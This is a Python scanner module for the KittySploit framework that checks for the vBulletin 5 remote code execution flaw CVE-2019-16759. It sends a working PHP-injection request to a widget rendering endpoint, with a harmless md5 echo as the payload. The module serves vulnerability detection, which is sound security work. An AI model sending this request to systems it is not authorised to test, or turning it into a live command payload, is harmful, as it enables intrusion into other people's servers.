#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vBulletin 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'vBulletin 5.0.0-5.5.4 - Remote Command Execution Detection',
        'description': 'vBulletin 5.0.0 through 5.5.4 is susceptible to a remote command execution vulnerability via the widgetConfig parameter in an ajax/render/widget_php routestring request. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'rce', 'kev', 'seclists', 'vbulletin', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/vbulletin-remote-code-execution-cve-2020-7373/',
            'https://seclists.org/fulldisclosure/2019/Sep/31',
            'https://www.theregister.co.uk/2019/09/24/vbulletin_vbug_zeroday/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-16759',
            'https://github.com/20142995/Goby',
        ],
        'cve': 'CVE-2019-16759',
    }

    def run(self):
        path = '/ajax/render/widget_tabbedcontainer_tab_panel'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20md5%28%22CVE-2019-16759%22%29%3B\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('addcc9f9f2f40e2e6aca3079b73d9d17',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='vBulletin 5.0.0-5.5.4 - Remote Command Execution detected', path=path)
            return True
        return False

